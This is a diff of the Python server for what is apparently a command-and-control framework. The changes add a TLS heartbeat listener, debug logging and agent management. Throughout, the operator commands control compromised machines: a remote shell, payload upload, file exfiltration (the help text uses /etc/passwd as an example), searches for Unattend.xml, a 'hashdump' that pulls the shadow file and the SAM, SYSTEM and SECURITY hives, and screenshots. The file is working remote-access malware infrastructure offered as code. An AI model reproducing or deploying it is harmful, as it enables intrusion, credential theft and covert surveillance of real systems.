@@ -4,9 +4,13 @@ from agent import Agent
 from symbols import *
 import select, datetime
 from prompt_toolkit import PromptSession
+import time
 
 DATA_CHUNK_SIZE = 1024
+COMMAND_CHUNK_SIZE = 4096
+BEAT_CHUNK_SIZE = 4
 INCOMING_FOLDER_NAME = "incoming"
+HEARTBEAT_TIMEOUT = 3
 
 
 class Server:
@@ -15,16 +19,20 @@ class Server:
     ################################################# CONSTRUCTOR ######################################################
     ####################################################################################################################
                                                                       
-    def __init__(self, address, port):
+    def __init__(self, address, port, beat, debug):
         self.address = address
         self.port = port
+        self.beat_port = beat
         self.agents = []
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.beat_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
         self.current_id = 1
         self.platform = platform.system()  # Initialize the C2 platform
         self.stop_event = threading.Event()  # Test to stop threads
-        self.current_agent = Agent(['',''],'',0)  # Dummy agent for initialisation
+        self.current_agent = Agent(['', ''], '', 0, 0)  # Dummy agent for initialisation
         self.is_exited = False
+        self.debug = debug
         self.banner = """
         ███████╗████████╗██████╗ ██╗   ██╗███████╗███████╗     ██████╗██████╗ 
         ██╔════╝╚══██╔══╝██╔══██╗╚██╗ ██╔╝██╔════╝██╔════╝    ██╔════╝╚════██╗
@@ -96,9 +104,6 @@ class Server:
             }
         }
 
-        self.agent_checker_thread = threading.Thread(target=self.check_agents)
-        self.agent_checker_thread.start()
-
     def __str__(self):
         return f"Server: {len(self.agents)} agents connected"
 
@@ -107,22 +112,32 @@ class Server:
     ####################################################################################################################
 
     def start(self):
+        self.debug_print("START", True)
         """Start the server, socket initialization, binding, listening and creation of SSL context for encryption"""
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.sock.bind((self.address, self.port))
-        self.sock.listen(5)
+        self.server_socket.bind((self.address, self.port))
+        self.server_socket.listen(5)
+        self.debug_print(f"Listening on port {self.port}")
 
-        self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+        self.beat_socket.bind((self.address, self.beat_port))
+        self.beat_socket.listen(5)
+        self.debug_print(f"Listening on port {self.beat_port}")
         try:
             self.context.load_cert_chain(certfile="server.crt", keyfile="server.key")
+            self.debug_print("Certificate imported")
         except FileNotFoundError:
             print("Error: Certificate and key files not found. Please generate them and place them in the same directory as the server.py file.")
             self.exit()
 
         print(self.banner)
         threading.Thread(target=self.accept_connections).start()
+        self.debug_print("Accept connection thread started")
+        threading.Thread(target=self.accept_beat).start()
+        self.debug_print("Accept beat thread started")
+        threading.Thread(target=self.check_agents).start()
+        self.debug_print("Check agents thread started")
 
     def main_loop(self):
+        self.debug_print("MAIN LOOP", True)
         session = PromptSession()
         while True:
             active_agent = f"[{len(self.agents)} active]" if self.current_agent.id == 0 else f"[Agent {self.current_agent.id}]"
@@ -146,7 +161,46 @@ class Server:
     ########################################### CONNECTION HANDLING ####################################################
     ####################################################################################################################
 
+    def agent_deserialization(self, client_socket):
+        # Get the json host information
+        json_string = client_socket.recv(DATA_CHUNK_SIZE).decode()
+        self.debug_print("Get the client information")
+        if not json_string:
+            self.debug_print("No client information")
+            return
+        json_object = json.loads(json_string)
+        self.debug_print("Information loaded as json object")
+
+        agent = self.new_agent(client_socket.getpeername(), client_socket)
+        self.debug_print("Agent object created")
+        agent.hostname = json_object['hostname']
+        agent.user = json_object['user']
+        agent.mac = json_object['mac']
+        agent.uid = json_object['uid']
+        agent.os = json_object['os']
+        agent.listening_beat_port = int(json_object['beat'])
+
+        return agent
+
+    def send_beat_id(self, agent):
+        # self.debug_print("SEND BEAT ID", True)
+
+        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
+
+        client_beat_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        # self.debug_print(f"Try to connect to {agent.ip}:{agent.listening_beat_port}")
+        client_beat_socket.connect((agent.ip, agent.listening_beat_port))
+        # self.debug_print("Beat socket connected")
+        id_to_send = agent.id.to_bytes(4, byteorder='big')
+        # self.debug_print(f"ID to send :: {id_to_send}")
+        client_beat_socket.sendall(id_to_send)
+        # self.debug_print("Beat ID sent")
+
     def handle_client(self, client_socket):
+        self.debug_print("HANDLE CLIENT", True)
         """
         Receive basic information about the target:
         - MAC address in integer
@@ -154,52 +208,106 @@ class Server:
         - UID of the agent (see getClientUID method in client)
         @param client_socket: the socket of the client
         """
-
-        json_string = client_socket.recv(DATA_CHUNK_SIZE).decode()
-        if not json_string:
-            return
-        json_object = json.loads(json_string)
-
-        agent = self.new_agent(client_socket.getpeername(), client_socket)
-
-        agent.hostname = json_object['hostname']
-        agent.user = json_object['user']
-        agent.mac = json_object['mac']
-        agent.uid = json_object['uid']
-        agent.os = json_object['os']
+        agent = self.agent_deserialization(client_socket)
+        self.send_beat_id(agent)
 
     def accept_connections(self):
         """Loop accepting incoming connections"""
+        self.debug_print("THREAD ACCEPT CONNECTIONS", True)
         while not self.stop_event.is_set():
+            client_socket, client_address = self.server_socket.accept()
+            self.debug_print(f"Got client connection from {client_address}")
             if self.is_exited:
+                self.debug_print("THREAD accept connections exiting")
                 return
-            client_socket, client_address = self.sock.accept()
             try:
                 client_socket = self.context.wrap_socket(client_socket, server_side=True)
+                self.debug_print("Socket wrapped")
                 self.handle_client(client_socket)
+                self.debug_print("Client handled")
+
             except ssl.SSLError as e:
                 print(f"SSL error: {e}")
             except OSError:
                 pass
 
     def close_all_connections(self):
+        self.debug_print("CLOSE ALL CONNECTIONS", True)
         for agent in self.agents:
             agent.sock.close()
+        self.debug_print("ALL CONNECTIONS CLOSED")
 
+    ####################################################################################################################
+    ############################################## HEARTBEAT ###########################################################
+    ####################################################################################################################
+    def accept_beat(self):
+        """Accept incoming heartbeats"""
+        self.debug_print("THREAD ACCEPT BEAT", True)
+        while not self.stop_event.is_set():
+            # self.debug_print("Waiting for beat")
+            client_socket, client_address = self.beat_socket.accept()
+            # self.debug_print(f"Got beat connection from {client_address}")
+            if self.is_exited:
+                # self.debug_print("THREAD accept beat exiting")
+                return
+            try:
+                client_socket = self.context.wrap_socket(client_socket, server_side=True)
+                # self.debug_print("Socket wrapped")
+                threading.Thread(target=self.handle_beat, args=[client_socket]).start()
+                # self.debug_print("Beat update handled")
+            except ssl.SSLError as e:
+                print(f"SSL error: {e}")
+            except OSError as e:
+                print(f"OSError : {e}")
+                pass
+
+    def handle_beat(self, client_socket):
+        """
+        Handle the heartbeat of the agent
+        @param client_socket: the socket of the agent
+        """
+        self.debug_print("HANDLE BEAT", True)
+        incoming_id = client_socket.recv(BEAT_CHUNK_SIZE)
+        self.debug_print(f"Got {len(incoming_id)} bytes")
+        agent_id = int.from_bytes(incoming_id, byteorder='big')
+        self.debug_print(f"Got beat from agent {agent_id}")
+        for agent in self.agents:
+            if agent.id == agent_id:
+                agent.last_beat = time.time()
+                self.debug_print(f"Agent {agent_id} updated")
+                break
+
+    def check_agents(self):
+        """Check if the agents are still alive by checking the last beat"""
+        self.debug_print("CHECK AGENTS", True)
+        while not self.stop_event.is_set():
+            if self.is_exited:
+                self.debug_print("THREAD check agents exiting")
+                return
+            for agent in self.agents:
+                if time.time() - agent.last_beat > HEARTBEAT_TIMEOUT:
+                    print(f"\nAgent {agent.id} died ({agent.ip})")
+                    self.delete_agent_by_id(agent.id)
+            self.stop_event.wait(2)
     ####################################################################################################################
     ############################################## USUAL METHODS #######################################################
     ####################################################################################################################
-    def simple_ssl_connection(self):
+    def simple_ssl_connection(self, port):
         """ Perform a simple SSL connection to the listening socket. Must be used to exit the server """
         # open connection socket to the listening socket. SSL connection
-        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
-        context.check_hostname = False
-        context.verify_mode = ssl.CERT_NONE
+        try:
+            self.debug_print("Sending a simple ssl connection")
+            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
 
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        secure_sock = context.wrap_socket(sock, server_hostname=self.address)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            secure_sock = context.wrap_socket(sock, server_hostname=self.address)
 
-        secure_sock.connect((self.address, self.port))
+            secure_sock.connect((self.address, port))
+            self.debug_print("Simple connection sent")
+        except Exception as e:
+            pass
 
     def help(self, args=None):
         """Print help for commands"""
@@ -219,11 +327,14 @@ class Server:
         generic function to send a file to the agent.
         @param file_path: the path of the file to send
         """
+        self.debug_print("SEND FILE", True)
         try:
             with open(file_path, 'rb') as f:
-                while chunk := f.read(DATA_CHUNK_SIZE):
+                while chunk := f.read(COMMAND_CHUNK_SIZE):
                     self.current_agent.sock.sendall(chunk)
+                    self.debug_print(f"Sending {len(chunk)} bytes")
             self.current_agent.sock.sendall(SIG_EOF)
+            self.debug_print("End of file")
             print(f'File sent: {file_path} ({os.path.getsize(file_path)} b)')
         except Exception:
             print("File not found")
@@ -234,11 +345,12 @@ class Server:
         generic function to get a file from the agent.
         @param file_name: the path of the file to get
         """
+        self.debug_print("GET FILE", True)
         file_length = 0
         try:
             with open(file_path, 'w+b') as f:
                 while True:
-                    data = self.current_agent.sock.recv(DATA_CHUNK_SIZE)
+                    data = self.current_agent.sock.recv(COMMAND_CHUNK_SIZE)
                     if data == SIG_EOF or not data:
                         break
                     if data == FILE_NOT_FOUND:
@@ -249,6 +361,10 @@ class Server:
                         print(f"ERROR: Insufficient permissions to get {file_path}.")
                         os.remove(file_path)
                         return
+                    elif data == OTHER_ERROR:
+                        print(f"ERROR: An error occurred on the target while getting the file.")
+                        os.remove(file_path)
+                        return
                     f.write(data)
                     file_length += len(data)
             print(f'File saved at {file_path} ({file_length} b)')
@@ -257,10 +373,13 @@ class Server:
             os.remove(file_path)
 
     def get_file_without_path(self, remote_file_path):
+        self.debug_print("GET FILE WITHOUT PATH", True)
         self.download_folder_creation()
         file_name = os.path.basename(remote_file_path)
         full_path = os.path.join(self.get_download_folder_path(), file_name)
+        self.debug_print(f"Full path : {full_path}")
         self.get_file(full_path)
+        self.debug_print(f"Got file at {full_path}")
 
     def get_download_folder_path(self):
         """Get the path of the folder where the downloaded files will be stored"""
@@ -272,73 +391,78 @@ class Server:
         full_local_path = self.get_download_folder_path()
         os.makedirs(full_local_path, exist_ok=True)
 
-    def is_socket_alive(self, sock):
-        """Check if the agents are still alive by checking the readability of the socket"""
-        try:
-            sock.settimeout(5)
-            # Passing the socket we want to check for readability in first argument with a timeout of 0.5 seconds
-            read_ready, _, _ = select.select([sock], [], [], 5)
-            if read_ready:
-                data = sock.recv(1)
-                if data == b'':
-                    return False
-            return True
-        except Exception:
-            return False
+    def debug_print(self, message, is_function=False):
+        if self.debug:
+            if is_function:
+                message = f"[+] {message}"
+            print(message)
 
     ####################################################################################################################
     ########################################### AGENT MANAGEMENT #######################################################
     ####################################################################################################################
 
     def new_agent(self, client_address, client_socket):
+        self.debug_print("NEW AGENT", True)
         agent_id = self.current_id
-        agent = Agent(client_address, client_socket, agent_id)
+        agent = Agent(client_address, client_socket, agent_id, time.time())
+        self.debug_print("Agent object created")
         self.current_id += 1
         print(f"\n[!] New connection:\n{agent}")
         self.add_agent(agent)
+        self.debug_print(f"Agent added :: {len(self.agents)} agents in the list")
         return agent
 
     def add_agent(self, agent_to_add: 'Agent'):
         """Add an agent to the C2 list"""
         self.agents.append(agent_to_add)
 
-    def kill_agent(self, id):
+    def delete_agent_by_id(self, id):
         try:
             id = int(id)
             found_flag = False
             for index, agent in enumerate(self.agents):
                 if agent.id == id:
                     found_flag = True
-                    agent.sock.sendall("kill".encode())
                     agent.sock.close()
                     self.agents.pop(index)
+                    self.debug_print(f"Agent deleted :: {len(self.agents)} agents in the list")
                     break
                 if not found_flag:
                     print(f"No agent with ID {id}")
             if self.current_agent.id == id:
-                self.current_agent = Agent(['',''],'',0)  # Reset with a dummy agent
+                self.current_agent = Agent(['',''],'',0, 0)  # Reset with a dummy agent
         except ValueError:
             print("Agent ID needs to be an Integer")
         except OSError:
             pass
 
-    def get_agent(self, id):
+    def kill_agent(self, id):
+        self.debug_print("KILL AGENT", True)
+        agent_to_kill = self.get_agent_by_id(id)
+        if agent_to_kill is not None:
+            agent_to_kill.sock.sendall("kill".encode())
+            self.debug_print(f"Kill command sent to {agent_to_kill.ip}")
+            self.delete_agent_by_id(id)
+
+    def get_agent_by_id(self, id):
         """ Get the agent object by ID """
         for agent in self.agents:
             if agent.id == id:
                 return agent
+        return None
 
     def select_agent(self, args):
+        self.debug_print("SELECT AGENT", True)
         try:
             id = int(args)
         except ValueError:
             print("Agent ID needs to be an Integer")
             return
-        for agent in self.agents:
-            if agent.id == id:
-                self.current_agent = self.get_agent(id)
-                return
-        print(f"No agent with ID {id}")
+        agent = self.get_agent_by_id(id)
+        if agent is not None:
+            self.current_agent = agent
+        else:
+            print(f"No agent with ID {id}")
 
     def display_agents(self, args=None):
         """Display all connected agents"""
@@ -360,17 +484,6 @@ class Server:
             return True
         else:
             print("Please select an agent")
-
-    def check_agents(self):
-        """Kill the agents if we can't contact them"""
-        while True:
-            if self.is_exited:
-                return
-            for agent in self.agents:
-                if not self.is_socket_alive(agent.sock):
-                    print(f"\nAgent {agent.id} died ({agent.ip})")
-                    self.kill_agent(agent.id)
-            self.stop_event.wait(2)
 
     def get_agent_uptime(self, agent):
         timestamp = datetime.datetime.now()
@@ -401,13 +514,28 @@ class Server:
         os.system(args)
 
     def exit(self, args=None):
+        self.debug_print("EXIT", True)
+        self.is_exited = True
         print("\nClosing server...")
         # unblock the listener
-        self.simple_ssl_connection()
+        self.simple_ssl_connection(self.port)
+        self.debug_print("Listening socket unblocked")
+
         self.server_socket.close()
+        self.debug_print("Listening socket closed")
+
+        self.simple_ssl_connection(self.beat_port)
+        self.debug_print("Beat socket unblocked")
+
+        self.beat_socket.close()
+        self.debug_print("Beat socket closed")
+
         self.stop_event.set()
+        self.debug_print("Event Stopped")
+
         self.close_all_connections()
-        self.is_exited = True
+        self.debug_print("All connections closed")
+
         exit(0)
 
     ####################################################################################################################
@@ -415,24 +543,29 @@ class Server:
     ####################################################################################################################
 
     def download(self, args):
-        self.current_agent.sock.sendall(f"upload {args}".encode())
+        self.debug_print("DOWNLOAD", True)
         args = list(filter(lambda x: x != "", args.split(" ")))
         if len(args) < 1:
             print("Please select at least one remote file to download\n\tEx: download /etc/passwd")
             return
+        self.current_agent.sock.sendall(f"upload {args}".encode())
+        self.debug_print("Ask for the agent to upload")
         for file_path in args:
             self.get_file_without_path(file_path)
 
     def upload(self, args):
+        self.debug_print("UPLOAD", True)
         args = list(filter(lambda x: x != "", args.split(" ")))
         if len(args) < 2:
             print("Please select a local file path and a remote path\n\tEx: upload payload.exe C:\\Users\\john\\Desktop\\payload.exe")
             return
         self.current_agent.sock.sendall(f"download {args[1]}".encode())
+        self.debug_print("Ask for the agent to download")
         self.send_file(args[0])
 
     def shell(self, args=None):
         """ Enter in shell mode. The commands are sent to the agent and the output is displayed """
+        self.debug_print("SHELL", True)
         self.current_agent.sock.sendall("shell".encode())
         session = PromptSession()
         while True:
@@ -440,26 +573,35 @@ class Server:
             if command == '':
                 continue
             if command.lower() == 'exit':
+                self.debug_print("Tell the agent to exit this mode")
                 self.current_agent.sock.sendall("exit".encode())
+                self.debug_print("Exiting the shell mode")
                 break
             self.current_agent.sock.sendall(command.encode())
+            self.debug_print("Command sent")
             print(self.current_agent.sock.recv(8192).decode('latin1'))
+            self.debug_print("Got the return of the command")
 
     def search(self,args):
+        self.debug_print("SEARCH", True)
         args = list(filter(lambda x: x != "", args.split(" ")))
         if len(args) < 2:
             print("Please specify a starting path and a file name\n\tEx: search C:\\ Unattend.xml")
             return
         self.current_agent.sock.sendall(f"search {args[0]} {args[1]}".encode())
+        self.debug_print("Search command sent")
         while True:
             data = self.current_agent.sock.recv(DATA_CHUNK_SIZE)
+            self.debug_print(f"Got {len(data)} bytes")
             decoded_data = data.decode("latin1")
             if (data == SIG_EOF) or (not data):
+                self.debug_print("End of file")
                 break
             print('---')
             print(decoded_data)
 
     def hashdump(self, args=None):
+        self.debug_print("HASHDUMP", True)
         files = []
         # file names
         shadow_filename = "shadow"
@@ -468,25 +610,36 @@ class Server:
         security_filename = "security"
         # set files to extract based on the OS
         if self.current_agent.os == "Linux":
+            self.debug_print("Linux hashdump")
             files.append(shadow_filename)
         elif self.current_agent.os == "Windows":
+            self.debug_print("Windows hashdump")
             files.append(sam_filename)
             files.append(system_filename)
             files.append(security_filename)
         else:
             print("OS not supported")
             return
+
+        self.debug_print("Files to retrieve:")
+        for file in files:
+            self.debug_print(f"{file}")
         # send the command to the agent
         self.current_agent.sock.sendall("hashdump".encode())
+        self.debug_print("hashdump command sent")
         for i in range(len(files)):
             self.get_file_without_path(files[i])
 
     def ipconfig(self, args=None):
+        self.debug_print("IPCONFIG", True)
         self.current_agent.sock.sendall("ipconfig".encode())
+        self.debug_print("ipconfig command sent")
         data = self.current_agent.sock.recv(16384)
+        self.debug_print("Got the ipconfig")
         print("\n" + data.decode('utf-8'))
 
     def screenshot(self, args):
+        self.debug_print("SCREENSHOT", True)
         self.current_agent.sock.sendall("screenshot".encode())
         args = list(filter(lambda x: x != "", args.split(" ")))
         if len(args) >= 1:
@@ -494,3 +647,4 @@ class Server:
         else:
             screen_path = f"{secrets.token_hex(5)}.jpg"
         self.get_file_without_path(screen_path)
+        self.debug_print("Got the screenshot")
